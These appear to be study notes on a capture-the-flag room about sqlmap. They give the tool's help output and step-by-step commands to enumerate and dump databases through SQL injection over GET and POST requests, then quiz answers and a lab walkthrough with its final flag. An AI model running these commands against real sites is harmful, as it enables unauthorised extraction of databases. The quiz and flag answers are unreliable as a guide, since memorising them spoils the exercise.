
## SQLMAP Commands:

_sqlmap -h for basic help menu.

```php
nare@nare$ sqlmap -h
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'
```

### **Basic** commands:

![[Pasted image 20240710080344.png]]

### **Enumeration** commands:

_These options can be used to enumerate the back-end database management system information, structure, and data contained in tables._

![[Pasted image 20240710080828.png]]

### Operating System access commands

 _These options can be used to access the back-end database management system on the target operating system._

![[Pasted image 20240710081026.png]]

Now that we've seen some of the options we can use with sqlmap, let’s jump into the examples using both GET and POST Method based requests.

  
**Simple HTTP GET Based Test**  
  
`sqlmap -u https://testsite.com/page.php?id=7 --dbs`  

Here we have used two flags: -u to state the vulnerable URL and --dbs to enumerate the database

**Simple HTTP POST Based Test**  

First, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select 'Copy to file', and save it to a directory. You could also copy the whole request and save it to a text file as well.

![[Pasted image 20240710081148.png]]

You’ll notice in the request above, we have a POST parameter 'blood_group' which could a vulnerable parameter.

![[Pasted image 20240710081234.png]]

Now that we’ve identified a potentially vulnerable parameter, let’s jump into the sqlmap and use the following command:  
  
`sqlmap -r req.txt -p blood_group --dbs`  

`sqlmap -r <request_file> -p <vulnerable_parameter> --dbs`

  

Here we have used two flags: -r to read the file, -p to supply the vulnerable parameter, and --dbs to enumerate the database.

```php
sqlmap -r req.txt -p blood_group --dbs
```

Now that we have the databases, let's extract tables from the database **blood**.

**Using GET based Method**  
  
`sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables`

**`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables`**  

**Using POST based Method**

`sqlmap -r req.txt -p blood_group -D blood --tables`

**`sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables`**

Once we run these commands, we should get the tables.

```php
sqlmap -r req.txt -p blood_group -D blood --tables
```

Once we have available tables, now let’s gather the columns from the table blood_db.  
  
**Using GET based Method**

`sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns`

**`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns`**

**Using POST based Method**

`sqlmap -r req.txt -D blood -T blood_db --columns`

**`sqlmap -r req.txt -D <database_name> -T <table_name> --columns`**

```php
sqlmap -r req.txt -D blood -T blood_db --columns
```

Or we can simply dump all the available databases and tables using the following commands.  

  
**Using GET based Method**

`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all`  
  
`sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all`  

  
**Using POST based Method**

`sqlmap -r req.txt -D <database_name> --dump-all`  
  
`sqlmap -r req.txt-p  -D <database_name> --dump-all`

---

_Answer the questions below

_Which flag or option will allow you to add a URL to the command?

**-u**

_Which flag would you use to add data to a POST request?

**--data**

_There are two parameters: username and password. How would you tell sqlmap to use the username parameter for the attack?

**-p username**

_Which flag would you use to show the advanced help menu?

**-hh**

_Which flag allows you to retrieve everything?

**-a**

_Which flag allows you to select the database name?

**-D**

_Which flag would you use to retrieve database tables?

**--tables**

_Which flag allows you to retrieve a table’s columns?  

**--columns**

_Which flag allows you to dump all the database table entries?

**--dump-all**

_Which flag will give you an interactive SQL Shell prompt?

**--sql-shell**

_You know the current db type is 'MYSQL'. Which flag allows you to enumerate only MySQL databases?

**--dbms=mysql**

---

Deploy the machine attached to this task, then navigate to `10.10.117.116` _(this machine can take up to 3 minutes to boot)_

**Task:** 

We have deployed an application to collect 'Blood Donations'. The request seems to be vulnerable.

Exploit a SQL Injection vulnerability on the vulnerable application to find the flag.  

Answer the questions below:

_What is the name of the interesting directory ?

**blood** 

![[Pasted image 20240710085334.png]]

_Who is the current db user? 

```php
sqlmap -r req.txt -D blood -T blood_db --current-user
```

**root**

_What is the final flag?

```php
sqlmap -r req.txt -D blood -T blood_db --dump-all
```

**thm{sqlm@p_is_L0ve}**

